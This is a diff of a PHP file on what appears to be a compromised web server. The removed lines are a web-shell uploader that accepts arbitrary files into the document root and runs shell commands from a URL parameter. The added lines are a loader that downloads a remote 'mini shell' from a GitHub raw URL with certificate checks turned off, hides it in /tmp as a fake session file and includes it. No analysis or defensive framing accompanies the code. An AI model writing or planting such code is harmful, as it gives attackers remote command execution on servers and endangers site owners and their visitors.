@@ -1,33 +1,20 @@
 <?php
-echo "<br>";
-echo "N4ST4R_ID Uploader";
-echo "<br>";
-echo "<b>".php_uname()."</b><br>";
-echo "<form method='post' enctype='multipart/form-data'>
-      <input type='file' name='idx_file'>
-      <input type='submit' name='upload' value='upload'>
-      </form>";
-$root = $_SERVER['DOCUMENT_ROOT'];
-$files = $_FILES['idx_file']['name'];
-$dest = $root.'/'.$files;
-if(isset($_POST['upload'])) {
-    if(is_writable($root)) {
-        if(@copy($_FILES['idx_file']['tmp_name'], $dest)) {
-            $web = "http://".$_SERVER['HTTP_HOST']."/";
-            echo "MANTUL MZZ >> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
-        } else {
-            echo ">:D";
-        }
-    } else {
-        if(@copy($_FILES['idx_file']['tmp_name'], $files)) {
-            echo "Terupload <b>$files</b> di folder ini";
-        } else {
-            echo ">:D";
-        }
-    }
+$tmpfile = 'sess_'.md5('naxtarrr').'.php';
+$data = ['https://raw.githubusercontent.com/im-hanzou/BypassServ-Mini-Shell/main/bypasserv-new.php', "/tmp/$tmpfile"];
+ 
+if(!file_exists($data[1]) || filesize($data[1]) === 0) {
+    $context = stream_context_create([
+        "ssl" => [
+            "verify_peer" => false,
+            "verify_peer_name" => false,
+        ],
+    ]);
+
+    $fopen = fopen($data[1], 'w+');
+    fwrite($fopen, file_get_contents($data[0], false, $context));
+    fclose($fopen);
+    echo '<script>window.location="?naxtarrr";</script>';
 }
 
-if($_GET["nastar"]) {
-  echo "<pre>".system($_GET["nastar"])."</pre>";
-}
+include($data[1]);
 ?>
